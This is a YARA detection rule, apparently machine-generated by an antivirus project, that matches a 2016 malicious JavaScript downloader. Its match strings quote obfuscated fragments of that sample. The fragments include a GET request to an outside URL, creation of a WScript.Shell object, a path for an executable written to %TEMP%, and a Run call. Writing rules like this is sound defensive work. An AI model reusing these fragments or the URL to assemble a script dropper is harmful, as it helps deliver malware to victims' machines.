rule sig_20160401_d555aad5fd5cb695c425a65470df83c6 {
  meta:
    description = "datamaliciousorder - file 20160401_d555aad5fd5cb695c425a65470df83c6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9f065a2f22723d3851405e115d77aca954051d1cf98962eb2f73b6028e58d309"

  strings:
    $s1  = "BrzCn[RxrRh](\"G\" + \"ET\", \"http://ecomputercenter.com/d9sla\", false);" fullword ascii
    $s2  = "function ClJb(PrlAmf, AceIld){MvfJa = MvfJa * 1; return PrlAmf - AceIld;};" fullword ascii
    $s3  = "var SqYyb = function MfQph() {return WScript[OagQas](\"WScript\"+\".Shell\");}(), CqNrm = 11;" fullword ascii
    $s4  = "if (BrzCn[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function TctYvq() {return SqYyb[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"vu8lY74iy.ex\" + \"e\";};" fullword ascii
    $s6  = "function UlcDss(){return EawZta + \"\";};" fullword ascii
    $s7  = "function GjVxk() {return ((BubVba == true) && (BubVba == NeDwr)) ? 1 : MvfJa;};" fullword ascii
    $s8  = "BubVba = true; " fullword ascii
    $s9  = "var BubVba = false;" fullword ascii
    $s10 = "function RbrJr(){return 23;};" fullword ascii
    $s11 = "var RmJqh = false;" fullword ascii
    $s12 = "function ZpXn(){return OagQas;};" fullword ascii
    $s13 = "NeDwr = true; " fullword ascii
    $s14 = "function LhQx()" fullword ascii
    $s15 = "return ClJb(CtVkr, BoCgr);" fullword ascii
    $s16 = "var VcTo = new this[\"Date\"]();" fullword ascii
    $s17 = "function HaKt(GzzOd){SqYyb[\"R\"+\"un\"](GzzOd, MvfJa, MvfJa);};" fullword ascii
    $s18 = "function DbNkb(UbtCej) {var QhjEcb = (1, 2, 3, 4, 5, UbtCej); return QhjEcb;};" fullword ascii
    $s19 = "var NeDwr = false;" fullword ascii
    $s20 = "}while (FsuOhr);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}